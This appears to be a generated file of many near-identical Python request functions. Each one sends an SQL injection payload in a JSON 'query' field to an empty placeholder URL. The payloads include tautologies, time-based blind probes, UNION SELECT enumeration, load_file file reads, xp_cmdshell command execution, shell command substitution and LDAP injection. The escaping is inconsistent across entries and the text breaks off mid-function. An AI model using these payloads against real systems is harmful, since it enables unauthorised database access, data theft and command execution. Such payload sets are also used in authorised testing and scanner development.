'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22PRINT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi') or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 3=3\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22));waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' waitfor delay '0:0:10'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221;\x28load_file\x28char\x2847,101,116,99,47,112,97,115, ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or%201=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22and 1 in \x28select var from temp\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or '7659'='7659\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'text' = n'text'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 1=1 or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar \x28200\x29 select \x40s = 0x73656c6 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22exec xp\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; exec master..xp_cmdshell 'ping 172.10.1.255'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x223.10E+17\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND email IS NULL; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22&\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or '\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'unusual' = 'unusual'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22//\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22truncate\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x27UNION SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar\x28200\x29 select \x40s = 0x77616974 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22tz_offset\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22sqlvuln\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22\x22));waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22||6\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or%201=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%2A%28%7C%28objectclass%3D%2A%29%29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 union select * from information_schema.tables;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22PRINT \x40\x40variable\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or isNULL\x281/0\x29 /*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2226 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22a\\x22=\\x22a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28sqlvuln\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND members.email IS NULL; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22and 1=\x28 if\x28\x28load_file\x28char\x28110,46,101,120,11 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220x770061006900740066006F0072002000640065006C00 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%20'sleep%2050'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22as\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22/**/or/**/1/**/=/**/1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22union all select \x40\x40version--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22,\x40variable\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28sqlattempt2\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or \x28EXISTS\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22t'exec master..xp_cmdshell 'nslookup www.googl ...\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%20$\x28sleep%2050\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%20or%20''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22||UTL_HTTP.REQUEST\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi' or 'x'='x';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
